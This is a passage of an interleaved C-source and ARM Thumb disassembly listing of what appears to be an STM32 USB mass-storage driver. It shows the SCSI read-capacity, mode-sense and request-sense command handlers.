 8009fa0:	f8b3 3064 	ldrh.w	r3, [r3, #100]	; 0x64
 8009fa4:	161b      	asrs	r3, r3, #24
 8009fa6:	b2da      	uxtb	r2, r3
 8009fa8:	697b      	ldr	r3, [r7, #20]
 8009faa:	751a      	strb	r2, [r3, #20]
  hmsc->bot_data[5] = (uint8_t)(hmsc->scsi_blk_size >>  16);
 8009fac:	697b      	ldr	r3, [r7, #20]
 8009fae:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009fb2:	f8b3 3064 	ldrh.w	r3, [r3, #100]	; 0x64
 8009fb6:	141b      	asrs	r3, r3, #16
 8009fb8:	b2da      	uxtb	r2, r3
 8009fba:	697b      	ldr	r3, [r7, #20]
 8009fbc:	755a      	strb	r2, [r3, #21]
  hmsc->bot_data[6] = (uint8_t)(hmsc->scsi_blk_size >>  8);
 8009fbe:	697b      	ldr	r3, [r7, #20]
 8009fc0:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009fc4:	f8b3 3064 	ldrh.w	r3, [r3, #100]	; 0x64
 8009fc8:	0a1b      	lsrs	r3, r3, #8
 8009fca:	b29b      	uxth	r3, r3
 8009fcc:	b2da      	uxtb	r2, r3
 8009fce:	697b      	ldr	r3, [r7, #20]
 8009fd0:	759a      	strb	r2, [r3, #22]
  hmsc->bot_data[7] = (uint8_t)(hmsc->scsi_blk_size);
 8009fd2:	697b      	ldr	r3, [r7, #20]
 8009fd4:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009fd8:	f8b3 3064 	ldrh.w	r3, [r3, #100]	; 0x64
 8009fdc:	b2da      	uxtb	r2, r3
 8009fde:	697b      	ldr	r3, [r7, #20]
 8009fe0:	75da      	strb	r2, [r3, #23]

  hmsc->bot_data_length = 8U;
 8009fe2:	697b      	ldr	r3, [r7, #20]
 8009fe4:	2208      	movs	r2, #8
 8009fe6:	60da      	str	r2, [r3, #12]

  return 0;
 8009fe8:	2300      	movs	r3, #0

}
 8009fea:	4618      	mov	r0, r3
 8009fec:	371c      	adds	r7, #28
 8009fee:	46bd      	mov	sp, r7
 8009ff0:	bd90      	pop	{r4, r7, pc}

08009ff2 <SCSI_ReadCapacity16>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_ReadCapacity16(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 8009ff2:	b590      	push	{r4, r7, lr}
 8009ff4:	b089      	sub	sp, #36	; 0x24
 8009ff6:	af00      	add	r7, sp, #0
 8009ff8:	60f8      	str	r0, [r7, #12]
 8009ffa:	460b      	mov	r3, r1
 8009ffc:	607a      	str	r2, [r7, #4]
 8009ffe:	72fb      	strb	r3, [r7, #11]
  UNUSED(params);
  uint32_t idx;
  int8_t ret;
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800a000:	68fb      	ldr	r3, [r7, #12]
 800a002:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800a006:	68fb      	ldr	r3, [r7, #12]
 800a008:	32b0      	adds	r2, #176	; 0xb0
 800a00a:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800a00e:	61bb      	str	r3, [r7, #24]

  if (hmsc == NULL)
 800a010:	69bb      	ldr	r3, [r7, #24]
 800a012:	2b00      	cmp	r3, #0
 800a014:	d102      	bne.n	800a01c <SCSI_ReadCapacity16+0x2a>
  {
    return -1;
 800a016:	f04f 33ff 	mov.w	r3, #4294967295
 800a01a:	e0ab      	b.n	800a174 <SCSI_ReadCapacity16+0x182>
  }

  ret = ((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->GetCapacity(lun, &hmsc->scsi_blk_nbr,
 800a01c:	68fb      	ldr	r3, [r7, #12]
 800a01e:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 800a022:	68fa      	ldr	r2, [r7, #12]
 800a024:	33b0      	adds	r3, #176	; 0xb0
 800a026:	009b      	lsls	r3, r3, #2
 800a028:	4413      	add	r3, r2
 800a02a:	685b      	ldr	r3, [r3, #4]
 800a02c:	685c      	ldr	r4, [r3, #4]
 800a02e:	69bb      	ldr	r3, [r7, #24]
 800a030:	f503 5383 	add.w	r3, r3, #4192	; 0x1060
 800a034:	3308      	adds	r3, #8
 800a036:	69ba      	ldr	r2, [r7, #24]
 800a038:	f502 5283 	add.w	r2, r2, #4192	; 0x1060
 800a03c:	3204      	adds	r2, #4
 800a03e:	7af8      	ldrb	r0, [r7, #11]
 800a040:	4619      	mov	r1, r3
 800a042:	47a0      	blx	r4
 800a044:	4603      	mov	r3, r0
 800a046:	75fb      	strb	r3, [r7, #23]
                                                                             &hmsc->scsi_blk_size);

  if ((ret != 0) || (hmsc->scsi_medium_state == SCSI_MEDIUM_EJECTED))
 800a048:	f997 3017 	ldrsb.w	r3, [r7, #23]
 800a04c:	2b00      	cmp	r3, #0
 800a04e:	d106      	bne.n	800a05e <SCSI_ReadCapacity16+0x6c>
 800a050:	69bb      	ldr	r3, [r7, #24]
 800a052:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a056:	f893 3062 	ldrb.w	r3, [r3, #98]	; 0x62
 800a05a:	2b02      	cmp	r3, #2
 800a05c:	d108      	bne.n	800a070 <SCSI_ReadCapacity16+0x7e>
  {
    SCSI_SenseCode(pdev, lun, NOT_READY, MEDIUM_NOT_PRESENT);
 800a05e:	7af9      	ldrb	r1, [r7, #11]
 800a060:	233a      	movs	r3, #58	; 0x3a
 800a062:	2202      	movs	r2, #2
 800a064:	68f8      	ldr	r0, [r7, #12]
 800a066:	f000 fa01 	bl	800a46c <SCSI_SenseCode>
    return -1;
 800a06a:	f04f 33ff 	mov.w	r3, #4294967295
 800a06e:	e081      	b.n	800a174 <SCSI_ReadCapacity16+0x182>
  }

  hmsc->bot_data_length = ((uint32_t)params[10] << 24) |
 800a070:	687b      	ldr	r3, [r7, #4]
 800a072:	330a      	adds	r3, #10
 800a074:	781b      	ldrb	r3, [r3, #0]
 800a076:	061a      	lsls	r2, r3, #24
                          ((uint32_t)params[11] << 16) |
 800a078:	687b      	ldr	r3, [r7, #4]
 800a07a:	330b      	adds	r3, #11
 800a07c:	781b      	ldrb	r3, [r3, #0]
 800a07e:	041b      	lsls	r3, r3, #16
  hmsc->bot_data_length = ((uint32_t)params[10] << 24) |
 800a080:	431a      	orrs	r2, r3
                          ((uint32_t)params[12] <<  8) |
 800a082:	687b      	ldr	r3, [r7, #4]
 800a084:	330c      	adds	r3, #12
 800a086:	781b      	ldrb	r3, [r3, #0]
 800a088:	021b      	lsls	r3, r3, #8
                          ((uint32_t)params[11] << 16) |
 800a08a:	4313      	orrs	r3, r2
                          (uint32_t)params[13];
 800a08c:	687a      	ldr	r2, [r7, #4]
 800a08e:	320d      	adds	r2, #13
 800a090:	7812      	ldrb	r2, [r2, #0]
                          ((uint32_t)params[12] <<  8) |
 800a092:	431a      	orrs	r2, r3
  hmsc->bot_data_length = ((uint32_t)params[10] << 24) |
 800a094:	69bb      	ldr	r3, [r7, #24]
 800a096:	60da      	str	r2, [r3, #12]

  for (idx = 0U; idx < hmsc->bot_data_length; idx++)
 800a098:	2300      	movs	r3, #0
 800a09a:	61fb      	str	r3, [r7, #28]
 800a09c:	e008      	b.n	800a0b0 <SCSI_ReadCapacity16+0xbe>
  {
    hmsc->bot_data[idx] = 0U;
 800a09e:	69ba      	ldr	r2, [r7, #24]
 800a0a0:	69fb      	ldr	r3, [r7, #28]
 800a0a2:	4413      	add	r3, r2
 800a0a4:	3310      	adds	r3, #16
 800a0a6:	2200      	movs	r2, #0
 800a0a8:	701a      	strb	r2, [r3, #0]
  for (idx = 0U; idx < hmsc->bot_data_length; idx++)
 800a0aa:	69fb      	ldr	r3, [r7, #28]
 800a0ac:	3301      	adds	r3, #1
 800a0ae:	61fb      	str	r3, [r7, #28]
 800a0b0:	69bb      	ldr	r3, [r7, #24]
 800a0b2:	68db      	ldr	r3, [r3, #12]
 800a0b4:	69fa      	ldr	r2, [r7, #28]
 800a0b6:	429a      	cmp	r2, r3
 800a0b8:	d3f1      	bcc.n	800a09e <SCSI_ReadCapacity16+0xac>
  }

  hmsc->bot_data[4] = (uint8_t)((hmsc->scsi_blk_nbr - 1U) >> 24);
 800a0ba:	69bb      	ldr	r3, [r7, #24]
 800a0bc:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a0c0:	6e9b      	ldr	r3, [r3, #104]	; 0x68
 800a0c2:	3b01      	subs	r3, #1
 800a0c4:	0e1b      	lsrs	r3, r3, #24
 800a0c6:	b2da      	uxtb	r2, r3
 800a0c8:	69bb      	ldr	r3, [r7, #24]
 800a0ca:	751a      	strb	r2, [r3, #20]
  hmsc->bot_data[5] = (uint8_t)((hmsc->scsi_blk_nbr - 1U) >> 16);
 800a0cc:	69bb      	ldr	r3, [r7, #24]
 800a0ce:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a0d2:	6e9b      	ldr	r3, [r3, #104]	; 0x68
 800a0d4:	3b01      	subs	r3, #1
 800a0d6:	0c1b      	lsrs	r3, r3, #16
 800a0d8:	b2da      	uxtb	r2, r3
 800a0da:	69bb      	ldr	r3, [r7, #24]
 800a0dc:	755a      	strb	r2, [r3, #21]
  hmsc->bot_data[6] = (uint8_t)((hmsc->scsi_blk_nbr - 1U) >>  8);
 800a0de:	69bb      	ldr	r3, [r7, #24]
 800a0e0:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a0e4:	6e9b      	ldr	r3, [r3, #104]	; 0x68
 800a0e6:	3b01      	subs	r3, #1
 800a0e8:	0a1b      	lsrs	r3, r3, #8
 800a0ea:	b2da      	uxtb	r2, r3
 800a0ec:	69bb      	ldr	r3, [r7, #24]
 800a0ee:	759a      	strb	r2, [r3, #22]
  hmsc->bot_data[7] = (uint8_t)(hmsc->scsi_blk_nbr - 1U);
 800a0f0:	69bb      	ldr	r3, [r7, #24]
 800a0f2:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a0f6:	6e9b      	ldr	r3, [r3, #104]	; 0x68
 800a0f8:	b2db      	uxtb	r3, r3
 800a0fa:	3b01      	subs	r3, #1
 800a0fc:	b2da      	uxtb	r2, r3
 800a0fe:	69bb      	ldr	r3, [r7, #24]
 800a100:	75da      	strb	r2, [r3, #23]

  hmsc->bot_data[8] = (uint8_t)(hmsc->scsi_blk_size >>  24);
 800a102:	69bb      	ldr	r3, [r7, #24]
 800a104:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a108:	f8b3 3064 	ldrh.w	r3, [r3, #100]	; 0x64
 800a10c:	161b      	asrs	r3, r3, #24
 800a10e:	b2da      	uxtb	r2, r3
 800a110:	69bb      	ldr	r3, [r7, #24]
 800a112:	761a      	strb	r2, [r3, #24]
  hmsc->bot_data[9] = (uint8_t)(hmsc->scsi_blk_size >>  16);
 800a114:	69bb      	ldr	r3, [r7, #24]
 800a116:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a11a:	f8b3 3064 	ldrh.w	r3, [r3, #100]	; 0x64
 800a11e:	141b      	asrs	r3, r3, #16
 800a120:	b2da      	uxtb	r2, r3
 800a122:	69bb      	ldr	r3, [r7, #24]
 800a124:	765a      	strb	r2, [r3, #25]
  hmsc->bot_data[10] = (uint8_t)(hmsc->scsi_blk_size >>  8);
 800a126:	69bb      	ldr	r3, [r7, #24]
 800a128:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a12c:	f8b3 3064 	ldrh.w	r3, [r3, #100]	; 0x64
 800a130:	0a1b      	lsrs	r3, r3, #8
 800a132:	b29b      	uxth	r3, r3
 800a134:	b2da      	uxtb	r2, r3
 800a136:	69bb      	ldr	r3, [r7, #24]
 800a138:	769a      	strb	r2, [r3, #26]
  hmsc->bot_data[11] = (uint8_t)(hmsc->scsi_blk_size);
 800a13a:	69bb      	ldr	r3, [r7, #24]
 800a13c:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a140:	f8b3 3064 	ldrh.w	r3, [r3, #100]	; 0x64
 800a144:	b2da      	uxtb	r2, r3
 800a146:	69bb      	ldr	r3, [r7, #24]
 800a148:	76da      	strb	r2, [r3, #27]

  hmsc->bot_data_length = ((uint32_t)params[10] << 24) |
 800a14a:	687b      	ldr	r3, [r7, #4]
 800a14c:	330a      	adds	r3, #10
 800a14e:	781b      	ldrb	r3, [r3, #0]
 800a150:	061a      	lsls	r2, r3, #24
                          ((uint32_t)params[11] << 16) |
 800a152:	687b      	ldr	r3, [r7, #4]
 800a154:	330b      	adds	r3, #11
 800a156:	781b      	ldrb	r3, [r3, #0]
 800a158:	041b      	lsls	r3, r3, #16
  hmsc->bot_data_length = ((uint32_t)params[10] << 24) |
 800a15a:	431a      	orrs	r2, r3
                          ((uint32_t)params[12] <<  8) |
 800a15c:	687b      	ldr	r3, [r7, #4]
 800a15e:	330c      	adds	r3, #12
 800a160:	781b      	ldrb	r3, [r3, #0]
 800a162:	021b      	lsls	r3, r3, #8
                          ((uint32_t)params[11] << 16) |
 800a164:	4313      	orrs	r3, r2
                          (uint32_t)params[13];
 800a166:	687a      	ldr	r2, [r7, #4]
 800a168:	320d      	adds	r2, #13
 800a16a:	7812      	ldrb	r2, [r2, #0]
                          ((uint32_t)params[12] <<  8) |
 800a16c:	431a      	orrs	r2, r3
  hmsc->bot_data_length = ((uint32_t)params[10] << 24) |
 800a16e:	69bb      	ldr	r3, [r7, #24]
 800a170:	60da      	str	r2, [r3, #12]

  return 0;
 800a172:	2300      	movs	r3, #0
}
 800a174:	4618      	mov	r0, r3
 800a176:	3724      	adds	r7, #36	; 0x24
 800a178:	46bd      	mov	sp, r7
 800a17a:	bd90      	pop	{r4, r7, pc}

0800a17c <SCSI_ReadFormatCapacity>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_ReadFormatCapacity(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 800a17c:	b580      	push	{r7, lr}
 800a17e:	b088      	sub	sp, #32
 800a180:	af00      	add	r7, sp, #0
 800a182:	60f8      	str	r0, [r7, #12]
 800a184:	460b      	mov	r3, r1
 800a186:	607a      	str	r2, [r7, #4]
 800a188:	72fb      	strb	r3, [r7, #11]
  UNUSED(params);
  uint16_t blk_size;
  uint32_t blk_nbr;
  uint16_t i;
  int8_t ret;
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800a18a:	68fb      	ldr	r3, [r7, #12]
 800a18c:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800a190:	68fb      	ldr	r3, [r7, #12]
 800a192:	32b0      	adds	r2, #176	; 0xb0
 800a194:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800a198:	61bb      	str	r3, [r7, #24]

  if (hmsc == NULL)
 800a19a:	69bb      	ldr	r3, [r7, #24]
 800a19c:	2b00      	cmp	r3, #0
 800a19e:	d102      	bne.n	800a1a6 <SCSI_ReadFormatCapacity+0x2a>
  {
    return -1;
 800a1a0:	f04f 33ff 	mov.w	r3, #4294967295
 800a1a4:	e063      	b.n	800a26e <SCSI_ReadFormatCapacity+0xf2>
  }

  ret = ((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->GetCapacity(lun, &blk_nbr, &blk_size);
 800a1a6:	68fb      	ldr	r3, [r7, #12]
 800a1a8:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 800a1ac:	68fa      	ldr	r2, [r7, #12]
 800a1ae:	33b0      	adds	r3, #176	; 0xb0
 800a1b0:	009b      	lsls	r3, r3, #2
 800a1b2:	4413      	add	r3, r2
 800a1b4:	685b      	ldr	r3, [r3, #4]
 800a1b6:	685b      	ldr	r3, [r3, #4]
 800a1b8:	f107 0214 	add.w	r2, r7, #20
 800a1bc:	f107 0110 	add.w	r1, r7, #16
 800a1c0:	7af8      	ldrb	r0, [r7, #11]
 800a1c2:	4798      	blx	r3
 800a1c4:	4603      	mov	r3, r0
 800a1c6:	75fb      	strb	r3, [r7, #23]

  if ((ret != 0) || (hmsc->scsi_medium_state == SCSI_MEDIUM_EJECTED))
 800a1c8:	f997 3017 	ldrsb.w	r3, [r7, #23]
 800a1cc:	2b00      	cmp	r3, #0
 800a1ce:	d106      	bne.n	800a1de <SCSI_ReadFormatCapacity+0x62>
 800a1d0:	69bb      	ldr	r3, [r7, #24]
 800a1d2:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a1d6:	f893 3062 	ldrb.w	r3, [r3, #98]	; 0x62
 800a1da:	2b02      	cmp	r3, #2
 800a1dc:	d108      	bne.n	800a1f0 <SCSI_ReadFormatCapacity+0x74>
  {
    SCSI_SenseCode(pdev, lun, NOT_READY, MEDIUM_NOT_PRESENT);
 800a1de:	7af9      	ldrb	r1, [r7, #11]
 800a1e0:	233a      	movs	r3, #58	; 0x3a
 800a1e2:	2202      	movs	r2, #2
 800a1e4:	68f8      	ldr	r0, [r7, #12]
 800a1e6:	f000 f941 	bl	800a46c <SCSI_SenseCode>
    return -1;
 800a1ea:	f04f 33ff 	mov.w	r3, #4294967295
 800a1ee:	e03e      	b.n	800a26e <SCSI_ReadFormatCapacity+0xf2>
  }

  for (i = 0U; i < 12U ; i++)
 800a1f0:	2300      	movs	r3, #0
 800a1f2:	83fb      	strh	r3, [r7, #30]
 800a1f4:	e007      	b.n	800a206 <SCSI_ReadFormatCapacity+0x8a>
  {
    hmsc->bot_data[i] = 0U;
 800a1f6:	8bfb      	ldrh	r3, [r7, #30]
 800a1f8:	69ba      	ldr	r2, [r7, #24]
 800a1fa:	4413      	add	r3, r2
 800a1fc:	2200      	movs	r2, #0
 800a1fe:	741a      	strb	r2, [r3, #16]
  for (i = 0U; i < 12U ; i++)
 800a200:	8bfb      	ldrh	r3, [r7, #30]
 800a202:	3301      	adds	r3, #1
 800a204:	83fb      	strh	r3, [r7, #30]
 800a206:	8bfb      	ldrh	r3, [r7, #30]
 800a208:	2b0b      	cmp	r3, #11
 800a20a:	d9f4      	bls.n	800a1f6 <SCSI_ReadFormatCapacity+0x7a>
  }

  hmsc->bot_data[3] = 0x08U;
 800a20c:	69bb      	ldr	r3, [r7, #24]
 800a20e:	2208      	movs	r2, #8
 800a210:	74da      	strb	r2, [r3, #19]
  hmsc->bot_data[4] = (uint8_t)((blk_nbr - 1U) >> 24);
 800a212:	693b      	ldr	r3, [r7, #16]
 800a214:	3b01      	subs	r3, #1
 800a216:	0e1b      	lsrs	r3, r3, #24
 800a218:	b2da      	uxtb	r2, r3
 800a21a:	69bb      	ldr	r3, [r7, #24]
 800a21c:	751a      	strb	r2, [r3, #20]
  hmsc->bot_data[5] = (uint8_t)((blk_nbr - 1U) >> 16);
 800a21e:	693b      	ldr	r3, [r7, #16]
 800a220:	3b01      	subs	r3, #1
 800a222:	0c1b      	lsrs	r3, r3, #16
 800a224:	b2da      	uxtb	r2, r3
 800a226:	69bb      	ldr	r3, [r7, #24]
 800a228:	755a      	strb	r2, [r3, #21]
  hmsc->bot_data[6] = (uint8_t)((blk_nbr - 1U) >>  8);
 800a22a:	693b      	ldr	r3, [r7, #16]
 800a22c:	3b01      	subs	r3, #1
 800a22e:	0a1b      	lsrs	r3, r3, #8
 800a230:	b2da      	uxtb	r2, r3
 800a232:	69bb      	ldr	r3, [r7, #24]
 800a234:	759a      	strb	r2, [r3, #22]
  hmsc->bot_data[7] = (uint8_t)(blk_nbr - 1U);
 800a236:	693b      	ldr	r3, [r7, #16]
 800a238:	b2db      	uxtb	r3, r3
 800a23a:	3b01      	subs	r3, #1
 800a23c:	b2da      	uxtb	r2, r3
 800a23e:	69bb      	ldr	r3, [r7, #24]
 800a240:	75da      	strb	r2, [r3, #23]

  hmsc->bot_data[8] = 0x02U;
 800a242:	69bb      	ldr	r3, [r7, #24]
 800a244:	2202      	movs	r2, #2
 800a246:	761a      	strb	r2, [r3, #24]
  hmsc->bot_data[9] = (uint8_t)(blk_size >>  16);
 800a248:	8abb      	ldrh	r3, [r7, #20]
 800a24a:	141b      	asrs	r3, r3, #16
 800a24c:	b2da      	uxtb	r2, r3
 800a24e:	69bb      	ldr	r3, [r7, #24]
 800a250:	765a      	strb	r2, [r3, #25]
  hmsc->bot_data[10] = (uint8_t)(blk_size >>  8);
 800a252:	8abb      	ldrh	r3, [r7, #20]
 800a254:	0a1b      	lsrs	r3, r3, #8
 800a256:	b29b      	uxth	r3, r3
 800a258:	b2da      	uxtb	r2, r3
 800a25a:	69bb      	ldr	r3, [r7, #24]
 800a25c:	769a      	strb	r2, [r3, #26]
  hmsc->bot_data[11] = (uint8_t)(blk_size);
 800a25e:	8abb      	ldrh	r3, [r7, #20]
 800a260:	b2da      	uxtb	r2, r3
 800a262:	69bb      	ldr	r3, [r7, #24]
 800a264:	76da      	strb	r2, [r3, #27]

  hmsc->bot_data_length = 12U;
 800a266:	69bb      	ldr	r3, [r7, #24]
 800a268:	220c      	movs	r2, #12
 800a26a:	60da      	str	r2, [r3, #12]

  return 0;
 800a26c:	2300      	movs	r3, #0
}
 800a26e:	4618      	mov	r0, r3
 800a270:	3720      	adds	r7, #32
 800a272:	46bd      	mov	sp, r7
 800a274:	bd80      	pop	{r7, pc}
	...

0800a278 <SCSI_ModeSense6>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_ModeSense6(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 800a278:	b580      	push	{r7, lr}
 800a27a:	b086      	sub	sp, #24
 800a27c:	af00      	add	r7, sp, #0
 800a27e:	60f8      	str	r0, [r7, #12]
 800a280:	460b      	mov	r3, r1
 800a282:	607a      	str	r2, [r7, #4]
 800a284:	72fb      	strb	r3, [r7, #11]
  UNUSED(lun);
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800a286:	68fb      	ldr	r3, [r7, #12]
 800a288:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800a28c:	68fb      	ldr	r3, [r7, #12]
 800a28e:	32b0      	adds	r2, #176	; 0xb0
 800a290:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800a294:	613b      	str	r3, [r7, #16]
  uint16_t len = MODE_SENSE6_LEN;
 800a296:	2317      	movs	r3, #23
 800a298:	82fb      	strh	r3, [r7, #22]

  if (hmsc == NULL)
 800a29a:	693b      	ldr	r3, [r7, #16]
 800a29c:	2b00      	cmp	r3, #0
 800a29e:	d102      	bne.n	800a2a6 <SCSI_ModeSense6+0x2e>
  {
    return -1;
 800a2a0:	f04f 33ff 	mov.w	r3, #4294967295
 800a2a4:	e011      	b.n	800a2ca <SCSI_ModeSense6+0x52>
  }

  if (params[4] <= len)
 800a2a6:	687b      	ldr	r3, [r7, #4]
 800a2a8:	3304      	adds	r3, #4
 800a2aa:	781b      	ldrb	r3, [r3, #0]
 800a2ac:	b29b      	uxth	r3, r3
 800a2ae:	8afa      	ldrh	r2, [r7, #22]
 800a2b0:	429a      	cmp	r2, r3
 800a2b2:	d303      	bcc.n	800a2bc <SCSI_ModeSense6+0x44>
  {
    len = params[4];
 800a2b4:	687b      	ldr	r3, [r7, #4]
 800a2b6:	3304      	adds	r3, #4
 800a2b8:	781b      	ldrb	r3, [r3, #0]
 800a2ba:	82fb      	strh	r3, [r7, #22]
  }

  (void)SCSI_UpdateBotData(hmsc, MSC_Mode_Sense6_data, len);
 800a2bc:	8afb      	ldrh	r3, [r7, #22]
 800a2be:	461a      	mov	r2, r3
 800a2c0:	4904      	ldr	r1, [pc, #16]	; (800a2d4 <SCSI_ModeSense6+0x5c>)
 800a2c2:	6938      	ldr	r0, [r7, #16]
 800a2c4:	f000 feb8 	bl	800b038 <SCSI_UpdateBotData>

  return 0;
 800a2c8:	2300      	movs	r3, #0
}
 800a2ca:	4618      	mov	r0, r3
 800a2cc:	3718      	adds	r7, #24
 800a2ce:	46bd      	mov	sp, r7
 800a2d0:	bd80      	pop	{r7, pc}
 800a2d2:	bf00      	nop
 800a2d4:	2000011c 	.word	0x2000011c

0800a2d8 <SCSI_ModeSense10>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_ModeSense10(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 800a2d8:	b580      	push	{r7, lr}
 800a2da:	b086      	sub	sp, #24
 800a2dc:	af00      	add	r7, sp, #0
 800a2de:	60f8      	str	r0, [r7, #12]
 800a2e0:	460b      	mov	r3, r1
 800a2e2:	607a      	str	r2, [r7, #4]
 800a2e4:	72fb      	strb	r3, [r7, #11]
  UNUSED(lun);
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800a2e6:	68fb      	ldr	r3, [r7, #12]
 800a2e8:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800a2ec:	68fb      	ldr	r3, [r7, #12]
 800a2ee:	32b0      	adds	r2, #176	; 0xb0
 800a2f0:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800a2f4:	613b      	str	r3, [r7, #16]
  uint16_t len = MODE_SENSE10_LEN;
 800a2f6:	231b      	movs	r3, #27
 800a2f8:	82fb      	strh	r3, [r7, #22]

  if (hmsc == NULL)
 800a2fa:	693b      	ldr	r3, [r7, #16]
 800a2fc:	2b00      	cmp	r3, #0
 800a2fe:	d102      	bne.n	800a306 <SCSI_ModeSense10+0x2e>
  {
    return -1;
 800a300:	f04f 33ff 	mov.w	r3, #4294967295
 800a304:	e011      	b.n	800a32a <SCSI_ModeSense10+0x52>
  }

  if (params[8] <= len)
 800a306:	687b      	ldr	r3, [r7, #4]
 800a308:	3308      	adds	r3, #8
 800a30a:	781b      	ldrb	r3, [r3, #0]
 800a30c:	b29b      	uxth	r3, r3
 800a30e:	8afa      	ldrh	r2, [r7, #22]
 800a310:	429a      	cmp	r2, r3
 800a312:	d303      	bcc.n	800a31c <SCSI_ModeSense10+0x44>
  {
    len = params[8];
 800a314:	687b      	ldr	r3, [r7, #4]
 800a316:	3308      	adds	r3, #8
 800a318:	781b      	ldrb	r3, [r3, #0]
 800a31a:	82fb      	strh	r3, [r7, #22]
  }

  (void)SCSI_UpdateBotData(hmsc, MSC_Mode_Sense10_data, len);
 800a31c:	8afb      	ldrh	r3, [r7, #22]
 800a31e:	461a      	mov	r2, r3
 800a320:	4904      	ldr	r1, [pc, #16]	; (800a334 <SCSI_ModeSense10+0x5c>)
 800a322:	6938      	ldr	r0, [r7, #16]
 800a324:	f000 fe88 	bl	800b038 <SCSI_UpdateBotData>

  return 0;
 800a328:	2300      	movs	r3, #0
}
 800a32a:	4618      	mov	r0, r3
 800a32c:	3718      	adds	r7, #24
 800a32e:	46bd      	mov	sp, r7
 800a330:	bd80      	pop	{r7, pc}
 800a332:	bf00      	nop
 800a334:	20000134 	.word	0x20000134

0800a338 <SCSI_RequestSense>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_RequestSense(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 800a338:	b580      	push	{r7, lr}
 800a33a:	b086      	sub	sp, #24
 800a33c:	af00      	add	r7, sp, #0
 800a33e:	60f8      	str	r0, [r7, #12]
 800a340:	460b      	mov	r3, r1
 800a342:	607a      	str	r2, [r7, #4]
 800a344:	72fb      	strb	r3, [r7, #11]
  UNUSED(lun);
  uint8_t i;
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 800a346:	68fb      	ldr	r3, [r7, #12]
 800a348:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800a34c:	68fb      	ldr	r3, [r7, #12]
 800a34e:	32b0      	adds	r2, #176	; 0xb0
 800a350:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800a354:	613b      	str	r3, [r7, #16]

  if (hmsc == NULL)
 800a356:	693b      	ldr	r3, [r7, #16]
 800a358:	2b00      	cmp	r3, #0
 800a35a:	d102      	bne.n	800a362 <SCSI_RequestSense+0x2a>
  {
    return -1;
 800a35c:	f04f 33ff 	mov.w	r3, #4294967295
 800a360:	e080      	b.n	800a464 <SCSI_RequestSense+0x12c>
  }

  if (hmsc->cbw.dDataLength == 0U)
 800a362:	693b      	ldr	r3, [r7, #16]
 800a364:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a368:	699b      	ldr	r3, [r3, #24]
 800a36a:	2b00      	cmp	r3, #0
 800a36c:	d10b      	bne.n	800a386 <SCSI_RequestSense+0x4e>
  {
    SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST, INVALID_CDB);
 800a36e:	693b      	ldr	r3, [r7, #16]
 800a370:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800a374:	7f59      	ldrb	r1, [r3, #29]
 800a376:	2320      	movs	r3, #32
 800a378:	2205      	movs	r2, #5
 800a37a:	68f8      	ldr	r0, [r7, #12]
 800a37c:	f000 f876 	bl	800a46c <SCSI_SenseCode>
    return -1;
 800a380:	f04f 33ff 	mov.w	r3, #4294967295
 800a384:	e06e      	b.n	800a464 <SCSI_RequestSense+0x12c>
  }

  for (i = 0U; i < REQUEST_SENSE_DATA_LEN; i++)
 800a386:	2300      	movs	r3, #0
 800a388:	75fb      	strb	r3, [r7, #23]
